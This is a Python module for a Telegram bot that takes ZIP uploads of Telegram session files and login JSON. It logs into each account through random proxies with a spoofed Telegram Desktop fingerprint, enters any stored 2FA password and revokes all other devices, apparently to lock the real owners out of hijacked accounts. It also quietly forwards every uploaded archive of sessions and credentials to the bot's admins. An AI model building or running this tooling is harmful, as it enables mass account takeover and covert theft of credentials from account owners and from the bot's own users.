import os
import zipfile
import shutil
import asyncio
import tempfile
import time
import json
import random
import logging
from datetime import datetime
from opentele.tl import TelegramClient
from opentele.api import API
from telethon.tl.functions.account import ResetAuthorizationRequest
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.account import GetAuthorizationsRequest
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from dotenv import load_dotenv

load_dotenv()
logger = logging.getLogger(__name__)

KICK_DEVICES_BACK = os.getenv("KICK_DEVICES_BACK", "").replace('\\n', '\n')
MAX_ZIP_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
BACK_BUTTON_EMOJI_ID = "5877629862306385808"

_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

user_kick_states = {}

def load_proxies():
    global _proxy_list, _proxy_list_last_load

    current_time = time.time()
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        return _proxy_list

    proxy_file = "proxy.txt"
    valid_proxies = []

    if not os.path.exists(proxy_file):
        logger.warning("proxy.txt 文件不存在")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue

                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                        else:
                            logger.debug(f"代理 {ip}:{port} 已过期")
                    except ValueError:
                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                        continue

    except Exception as e:
        logger.error(f"读取 proxy.txt 失败: {e}")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

def create_back_button():
    return InlineKeyboardButton(
        "返回主菜单",
        callback_data="back_to_main"
    ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}

async def generate_json_for_session(session_file, client, me, api_id, api_hash, official_api):
    json_path = session_file.replace('.session', '.json')
    phone = me.phone if me.phone else os.path.basename(session_file).replace('.session', '')
    reg_time = datetime.now().strftime("%Y-%m-%d")

    device_model = getattr(official_api, 'device_model', 'Desktop')
    system_version = getattr(official_api, 'system_version', '')
    app_version = getattr(official_api, 'app_version', '')
    system_lang_code = getattr(official_api, 'system_lang_code', 'en')
    lang_pack = getattr(official_api, 'lang_pack', '')
    lang_code = getattr(official_api, 'lang_code', 'en')
    pid = getattr(official_api, 'pid', random.randint(100000, 999999))

    json_data = {
        "api_id": api_id,
        "api_hash": api_hash,
        "device_model": device_model,
        "system_version": system_version,
        "app_version": app_version,
        "system_lang_code": system_lang_code,
        "lang_pack": lang_pack,
        "lang_code": lang_code,
        "pid": pid,
        "user_id": me.id,
        "phone": phone,
        "twofa": "",
        "password": "",
        "app_id": api_id,
        "app_hash": api_hash,
        "session_file": os.path.basename(session_file).replace('.session', ''),
        "device": device_model,
        "username": me.username or "",
        "sex": None,
        "avatar": "img/default.png",
        "package_id": "",
        "installer": "",
        "ipv6": False,
        "SDK": system_version,
        "sdk": system_version,
        "system_lang_pack": system_lang_code,
        "premium": getattr(me, 'premium', False),
        "reg_time": reg_time
    }

    try:
        os.makedirs(os.path.dirname(json_path), exist_ok=True)
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
        logger.info(f"已为 {session_file} 生成 JSON 配置: {json_path}")
        return json_path
    except Exception as e:
        logger.error(f"生成 JSON 失败 {session_file}: {e}")
        return None

async def show_kick_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [[create_back_button()]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text=KICK_DEVICES_BACK,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    user_kick_states[str(query.from_user.id)] = "waiting_kick_zip"

async def kick_other_devices(client):
    try:
        result = await client(GetAuthorizationsRequest())
        devices = result.authorizations
        current_device = None
        other_devices = []
        
        for d in devices:
            if d.current:
                current_device = d
            else:
                other_devices.append(d)
        
        device_count = len(other_devices)
        logger.info(f"发现 {device_count} 个其他设备")
        
        if device_count == 0:
            return True, "没有发现其他设备，无需踢出"
        
        success_count = 0
        for device in other_devices:
            try:
                await client(ResetAuthorizationRequest(hash=device.hash))
                success_count += 1
                logger.info(f"已踢出设备: {device.device_model} - {device.country}")
                await asyncio.sleep(0.5)
            except Exception as e:
                logger.warning(f"踢出设备 {device.device_model} 失败: {e}")
        
        if success_count == device_count:
            return True, f"成功踢出所有其他设备 (共 {device_count} 个)"
        else:
            return False, f"部分成功: 踢出 {success_count}/{device_count} 个设备"
            
    except Exception as e:
        error_str = str(e).lower()
        if "not allowed" in error_str or "flood" in error_str:
            logger.warning(f"踢设备受限: {e}")
            return False, f"操作受限: {str(e)[:50]}"
        logger.error(f"踢设备异常: {e}")
        return False, f"操作失败: {str(e)[:50]}"

async def check_session_kick(session_file, json_file, api_id, api_hash):
    client = None
    result = {
        "session": os.path.basename(session_file),
        "status": "unknown",
        "message": ""
    }

    json_2fa = None
    json_app_id = None
    json_app_hash = None
    device_model = None
    app_version = None
    system_lang_code = None
    system_vision = None
    lang_pack = None

    if json_file and os.path.exists(json_file):
        try:
            with open(json_file, 'r', encoding='utf-8') as f:
                json_data = json.load(f)
                json_2fa = json_data.get('2fa') or json_data.get('2FA') or json_data.get('password')
                json_app_id = json_data.get('app_id')
                json_app_hash = json_data.get('app_hash')
                device_model = json_data.get('device')
                app_version = json_data.get('app_version')
                system_lang_code = json_data.get('system_lang_pack')
                system_vision = json_data.get('system_vision') or json_data.get('sdk')
                lang_pack = json_data.get('lang_pack')
        except Exception as e:
            pass

    final_api_id = api_id
    final_api_hash = api_hash
    if json_app_id:
        try:
            final_api_id = int(json_app_id)
        except (ValueError, TypeError):
            logger.warning(f"无效的 app_id: {json_app_id}, 使用默认值")
    if json_app_hash:
        final_api_hash = str(json_app_hash)

    proxy = get_random_proxy()
    proxy_dict = create_proxy_dict(proxy) if proxy else None

    try:
        official_api = API.TelegramDesktop.Generate()
        official_api.api_id = final_api_id
        official_api.api_hash = final_api_hash
        if device_model:
            official_api.device_model = device_model
        if app_version:
            official_api.app_version = app_version
        if system_lang_code:
            official_api.system_lang_code = system_lang_code
        if system_vision:
            official_api.system_version = system_vision
        if lang_pack:
            official_api.lang_pack = lang_pack
            official_api.lang_code = lang_pack

        client = TelegramClient(
            session_file,
            api=official_api,
            proxy=proxy_dict
        )
        await client.connect()

        if not await client.is_user_authorized():
            result["status"] = "failed"
            result["message"] = "session无效"
            return result

        me = await client.get_me()
        if not me:
            result["status"] = "failed"
            result["message"] = "无法获取用户信息"
            return result

        result["phone"] = me.phone

        if json_2fa:
            try:
                await client.sign_in(password=json_2fa)
            except SessionPasswordNeededError:
                result["status"] = "failed"
                result["message"] = "2FA密码错误"
                return result
            except Exception as e:
                pass

        if not json_file or not os.path.exists(json_file):
            generated = await generate_json_for_session(session_file, client, me, final_api_id, final_api_hash, official_api)
            if generated:
                logger.info(f"为 {session_file} 生成 JSON 成功")

        success, msg = await kick_other_devices(client)
        if success:
            result["status"] = "success"
            result["message"] = msg
        else:
            result["status"] = "failed"
            result["message"] = msg

    except SessionPasswordNeededError:
        result["status"] = "failed"
        result["message"] = "需要2FA验证"
    except FloodWaitError as e:
        result["status"] = "failed"
        result["message"] = f"等待{e.seconds}秒"
    except Exception as e:
        result["status"] = "failed"
        result["message"] = f"错误: {str(e)[:30]}"
    finally:
        if client:
            await client.disconnect()

    return result

async def handle_kick_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    document = update.message.document

    if not document.file_name.endswith('.zip'):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        user_kick_states.pop(user_id, None)
        return

    status_msg = await update.message.reply_text(
        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
        parse_mode='HTML'
    )

    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/kick_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)

        await status_msg.edit_text(
            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 开始处理踢设备任务...",
            parse_mode='HTML'
        )

        await process_kick(update, context, zip_path, user_id)

        try:
            os.remove(zip_path)
        except:
            pass

    except Exception as e:
        logger.error(f"处理文件失败: {e}")
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    finally:
        user_kick_states.pop(user_id, None)
        try:
            await status_msg.delete()
        except:
            pass

async def process_kick(update, context, zip_path, user_id):
    file_size = os.path.getsize(zip_path)
    if file_size > MAX_ZIP_SIZE:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 文件过大，最大允许 {MAX_ZIP_SIZE//1024//1024}MB",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return

    api_id_str = os.getenv("TELEGRAM_APP_ID")
    api_hash = os.getenv("TELEGRAM_APP_HASH")
    admins = os.getenv("ADMIN_ID", "").split(",")

    if not api_id_str or not api_hash:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 系统未配置，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return

    try:
        api_id = int(api_id_str)
    except (ValueError, TypeError):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> API配置错误，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return

    try:
        await asyncio.wait_for(
            _process_kick_internal(update, context, zip_path, user_id, api_id, api_hash, admins),
            timeout=MAX_TASK_TIME
        )
    except asyncio.TimeoutError:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)",
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def _process_kick_internal(update, context, zip_path, user_id, api_id, api_hash, admins):
    with tempfile.TemporaryDirectory() as temp_dir:
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)

        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
        except Exception as e:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 解压失败: {str(e)}",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return

        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.endswith('.session'):
                    session_path = os.path.join(root, file)
                    session_files.append(session_path)

        if not session_files:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到session文件",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return

        status_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>踢设备进行中</b>

找到 <b>{len(session_files)}</b> 个session文件
<tg-emoji emoji-id="5775887550262546277">🔄</tg-emoji>正在处理，请稍候...""",
            parse_mode='HTML'
        )

        success_dir = os.path.join(temp_dir, "success")
        failed_dir = os.path.join(temp_dir, "failed")

        os.makedirs(success_dir, exist_ok=True)
        os.makedirs(failed_dir, exist_ok=True)

        success_count = 0
        failed_count = 0

        results = []

        for i, session_file in enumerate(session_files, 1):
            session_name = os.path.splitext(os.path.basename(session_file))[0]
            json_file = os.path.join(os.path.dirname(session_file), f"{session_name}.json")
            if not os.path.exists(json_file):
                json_file = None

            if i % 3 == 0 or i == len(session_files):
                try:
                    await status_msg.edit_text(
                        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>踢设备进行中</b>

进度: {i}/{len(session_files)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>成功: {success_count} | <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji>失败: {failed_count}""",
                        parse_mode='HTML'
                    )
                except:
                    pass

            result = await check_session_kick(session_file, json_file, api_id, api_hash)
            results.append(result)
            logger.info(f"账号 {result['session']} 踢设备结果: {result['status']} - {result['message']}")

            if result["status"] == "success":
                target_dir = success_dir
                success_count += 1
            else:
                target_dir = failed_dir
                failed_count += 1

            try:
                shutil.copy2(session_file, os.path.join(target_dir, os.path.basename(session_file)))
            except:
                pass

            if json_file and os.path.exists(json_file):
                try:
                    shutil.copy2(json_file, os.path.join(target_dir, os.path.basename(json_file)))
                except:
                    pass

            await asyncio.sleep(0.5)

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

        success_zip = os.path.join(temp_dir, "success.zip")
        if success_count > 0:
            with zipfile.ZipFile(success_zip, 'w') as zipf:
                for root, dirs, files in os.walk(success_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, success_dir)
                        zipf.write(file_path, arcname)

        failed_zip = os.path.join(temp_dir, "failed.zip")
        if failed_count > 0:
            with zipfile.ZipFile(failed_zip, 'w') as zipf:
                for root, dirs, files in os.walk(failed_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, failed_dir)
                        zipf.write(file_path, arcname)

        result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>踢设备完成</b>

<tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 统计结果:
• <tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 总账号: <b>{len(session_files)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功: <b>{success_count}</b>
• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>"""

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=result_text,
            parse_mode='HTML'
        )

        if success_count > 0:
            with open(success_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"success_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 成功踢设备 ({success_count}个)</b>",
                    parse_mode='HTML'
                )

        if failed_count > 0:
            with open(failed_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"failed_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> 失败 ({failed_count}个)</b>",
                    parse_mode='HTML'
                )

        for admin_id in admins:
            admin_id = admin_id.strip()
            if not admin_id:
                continue

            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>踢设备任务完成</b>

<tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 用户: <code>{user_id}</code>
<tg-emoji emoji-id="5886412370347036129">📊</tg-emoji> 总账号: <b>{len(session_files)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功: <b>{success_count}</b>
• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>""",
                    parse_mode='HTML'
                )

                admin_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

                if success_count > 0:
                    with open(success_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"success_{user_id}_{admin_timestamp}.zip"
                        )

                if failed_count > 0:
                    with open(failed_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"failed_{user_id}_{admin_timestamp}.zip"
                        )
            except Exception as e:
                logger.error(f"发送给管理员 {admin_id} 失败: {e}")

        try:
            await status_msg.delete()
        except:
            pass
